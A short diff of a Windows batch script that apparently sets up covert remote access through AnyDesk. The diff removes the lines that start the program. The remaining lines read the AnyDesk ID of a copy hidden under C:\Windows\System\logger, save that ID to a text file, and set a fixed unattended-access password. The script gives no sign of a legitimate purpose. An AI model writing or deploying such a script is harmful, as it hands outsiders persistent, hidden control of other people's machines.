@@ -1,6 +1,4 @@
 @echo off
-C:\Windows\System\logger\AnyDesk\AnyDesk.exe --start
-timeout 5
 for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-id') do set ID=%%i 
 echo AnyDesk ID is: %ID% > C:\Windows\System\logger\AnyDesk\anydesk.txt
 echo RTR1 | anydesk.exe --set-password
